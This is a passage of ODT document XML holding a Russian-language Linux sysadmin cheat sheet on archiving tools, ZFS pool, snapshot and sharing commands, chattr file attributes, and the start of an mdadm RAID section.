text:style-name="T2">dir</text:span><text:span text:style-name="T3">1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># rar a file1.rar test_file - Упаковать в rar архив file1.rar файл test_file</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># rar x file.rar - Разархивировать rar архив file.rar</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># bzip2 file1 - Сжимает файл file1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># bunzip2 file1.bz2 - Разжимает файл file1.bz2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># gzip file1 - Сжимает файл file1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># gunzip file1.gz - Разжимает файл file1.gz</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -cvf archive.tar file1 file2 dir1 - </text:span><text:span text:style-name="T3">Создать</text:span><text:span text:style-name="T2"> tar </text:span><text:span text:style-name="T3">архив</text:span><text:span text:style-name="T2"> archive.tar, </text:span><text:span text:style-name="T3">упаковав</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">него</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файлы</text:span><text:span text:style-name="T2"> file1, file2 </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">директорию</text:span><text:span text:style-name="T2"> dir1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -cvf archive.tar file - </text:span><text:span text:style-name="T3">Упаковать</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> tar-</text:span><text:span text:style-name="T3">архив</text:span><text:span text:style-name="T2"> archive.tar, </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> file</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -tf archive.tar - </text:span><text:span text:style-name="T3">Вывести</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">содержимое</text:span><text:span text:style-name="T2"> tar </text:span><text:span text:style-name="T3">архива</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -xvf archive.tar - </text:span><text:span text:style-name="T3">Распаковать</text:span><text:span text:style-name="T2"> tar </text:span><text:span text:style-name="T3">архив</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -xvf archive.tar -C /tmp - Распаковать архив в /tmp</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">cvfz</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">archive</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1 - Создать </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> архив и сжать его с помощью программы </text:span><text:span text:style-name="T2">gzip</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">xvfz</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">archive</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gz</text:span><text:span text:style-name="T3"> - Разжать </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> архив и распаковать его</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">cvfj</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">archive</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">bz</text:span><text:span text:style-name="T3">2 </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1 - Создать архив и сжать его с помощью </text:span><text:span text:style-name="T2">bzip</text:span><text:span text:style-name="T3">2 (ключ -</text:span><text:span text:style-name="T2">j</text:span><text:span text:style-name="T3"> работает не во всех *</text:span><text:span text:style-name="T2">nix</text:span><text:span text:style-name="T3"> системах )</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">xvfj</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">archive</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tar</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">bz</text:span><text:span text:style-name="T3">2 - Разжать архив и распаковать его (ключ -</text:span><text:span text:style-name="T2">j</text:span><text:span text:style-name="T3"> работает не во всех *</text:span><text:span text:style-name="T2">nix</text:span><text:span text:style-name="T3"> системах)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Создать сжатый </text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3">-архив</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2 </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1 - Запаковать в архив несколько файлов и/или директорий</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">unzip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3"> - Разжать и распаковать </text:span><text:span text:style-name="T2">zip</text:span><text:span text:style-name="T3">-архив</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">unrar</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3"> - Распаковать </text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3">-архив</text:span></text:p>
      <text:p text:style-name="P13">Работа с правами доступа файлов и директорий</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Шпаргалка по </text:span><text:span text:style-name="T2">ZFS</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">modinfo</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">head</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 9 - узнать версию </text:span><text:span text:style-name="T2">ZFS</text:span><text:span text:style-name="T3"> и другие подробности</text:span></text:p>
      <text:p text:style-name="P1">Информация о пулах / файловых системах (ФС) на пулах</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> - статус пулов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">status</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3"> - статус пулов подробный</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> - список ФС, так называются монтируемые разделы в пулах</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">get</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">all</text:span><text:span text:style-name="T3"> - вся инфа по пулам, вообще вся</text:span></text:p>
      <text:p text:style-name="P1">Управление пулами / дисками</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">lha</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">by</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">id</text:span><text:span text:style-name="T3">/ - выяснить айдишники дисков чтобы потом на них создать пул (будут проблемы если подцепишь по буквенному названию диска типа </text:span><text:span text:style-name="T2">sda</text:span><text:span text:style-name="T3">, они динамически меняются)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">create</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">id</text:span><text:span text:style-name="T3">-1 </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">id</text:span><text:span text:style-name="T3">-2 - может быть сколько угодно дисков, с ключом -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> форсить создание пула</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">create</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">id</text:span><text:span text:style-name="T3">-1 - создать пул с указанием папки маунтирования</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">destroy</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> - уничтожить пул </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">, с ключом -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> форсить уничтожение</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mkfile</text:span><text:span text:style-name="T3"> 100</text:span><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">1 </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">2 - создать файлы дисков</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">create</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">1 /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">2- создать пул </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> на созданных файлах</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">create</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mirror</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">1 /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">2 - создать пул </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> с зеркалированием на 2 диска</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">add</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - добавить диск в пул</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">attach</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - добавить устройство в пул, если он в зеркале то станет в зеркало, если простой, то пул расширится</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mirror</text:span><text:span text:style-name="T3">-1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">detach</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - исключить устройство из пула</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disk</text:span><text:span text:style-name="T3">3 - удаление устройства из пула</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">add</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">spare</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - добавление диска горячей замены в пул</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spare</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - удаление диска горячей замены из пула</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">offline</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">1 - отключить устройство, на него не будет никакой записи и с него чтения, если добавить ключ -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3">, то после ребута станет онлайн</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool online zfspool /disk1 - включить disk1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">replace</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">1 /</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3 - заменить </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3"> 1, например в случае неисправности на </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">3</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zpool</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">upgrade</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3"> - увидеть версию, и фичи текущего </text:span><text:span text:style-name="T2">ZFS</text:span><text:span text:style-name="T3">, -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> обновит все пулы до новейшей версии</text:span></text:p>
      <text:p text:style-name="P1">Создание ФС и свойства ФС</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data</text:span><text:span text:style-name="T3"> - создать ФС </text:span><text:span text:style-name="T2">data</text:span></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backups</text:span><text:span text:style-name="T3"> создать ФС </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">, обе ФС будут бесконтрольно расти, пока не выставлены квоты</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">destroy</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">fr</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">old</text:span><text:span text:style-name="T3"> - уничтожит ФС </text:span><text:span text:style-name="T2">old</text:span><text:span text:style-name="T3">, ключ -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> - рекурсивно, если внутри ещё несколько ФС, -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> - форсить</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">set</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">reservation</text:span><text:span text:style-name="T3">=1</text:span><text:span text:style-name="T2">G</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3"> - зарезервировать 1 Гигабайт, который ФС гарантированно получит, а другие не займут</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quota</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> - выяснить квоту в пуле на ФС </text:span><text:span text:style-name="T2">backups</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">set</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">quota</text:span><text:span text:style-name="T3">=1</text:span><text:span text:style-name="T2">G</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> - установить квоту в 1 Гигабайт на ФС </text:span><text:span text:style-name="T2">backups</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compression</text:span><text:span text:style-name="T3"> - проверить включена компрессия или нет</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs set compression=on zfspool/backups - включить компрессию на ФС backups в пуле zfspool</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs set sharesmb=on zfspool/backups - расшарить по SMB ФС backups средствами ZFS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs set sharenfs=on zfspool/backups - расшарить по NFS ФС backups средствами ZFS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Маунт</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> - отобразить все маунтированные ФС</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">zfs mount zfspool/backups - маунт ФС backups</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs umount zfspool/backups - анмаунт ФС backups</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs mount -a - маунт всех ФС ZFS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs umount -a Umount - анмаунт всех ФС ZFS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Снапшоты</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs list -t snapshot - отобразить все снапшоты</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">space</text:span><text:span text:style-name="T3"> - сколько занимают места снапшоты и конкретные дети пулов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">snapshot</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> - создать снапшот ФС </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> с названием </text:span><text:span text:style-name="T2">test</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">rollback</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> - вернуться к снапшоту </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> с названием </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">, с ключом -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> рекурсивно уничтожит промежуточные снапшоты, с ключом -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> форсит анмаунт и ремаунт</text:span></text:p>
      <text:p text:style-name="P14"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test</text:span><text:span text:style-name="T3"> - уничтожить снапшот </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> с названием </text:span><text:span text:style-name="T2">test</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g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сделать локальный бекап снапшота </text:span><text:span text:style-name="T2">march</text:span><text:span text:style-name="T3">2021</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">receive</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">2/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">2 &l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Восстановить из локального снапшота ФС на другом пуле</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zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">receive</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">2/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">2 - Комбо предыдущих двух</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ssh</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">COMP</text:span><text:span text:style-name="T3">02 “</text:span><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">receive</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">testpool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">testfs</text:span><text:span text:style-name="T3">” - Отправить снапшот по </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> на хост </text:span><text:span text:style-name="T2">COMP</text:span><text:span text:style-name="T3">02</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">clone</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">march</text:span><text:span text:style-name="T3">2021 /</text:span><text:span text:style-name="T2">clones</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> - Клонировать существующий снапшот</text:span></text:p>
      <text:p text:style-name="P11"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march</text:span><text:span text:style-name="T3">2021 - Уничтожить клон</text:span></text:p>
      <text:p text:style-name="P1">Атрибуты файлов</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Разрешает только добавление данных в файл</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Игнорировать данный файл при создании резервной копии с помощью программы </text:span><text:span text:style-name="T2">dump</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Разрешить ядру автоматически сжимать/разжимать содержимое файла</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Защита файла от каких-либо изменений или манипуляций: редактирование, перемещение, удаление, создание ссылок на него</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">S</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Определяет, будет-ли при сохранении изменений, произведена синхронизация, как при использовании команды </text:span><text:span text:style-name="T2">sync</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - При удалении файла с данным атрибутом, его будет сохранено, что-бы оставить пользователю возможность восстановить данные в случае необходимости</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">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span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">lsattr</text:span><text:span text:style-name="T3"> - Листинг файлов с атрибутами</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Шпаргалка по </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> - утилита для работы с программными </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">-массивами различных уровней. В данной инструкции рассмотрим примеры ее использования.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Информация о </text:span><text:span text:style-name="T2">RAID</text:span></text:p>
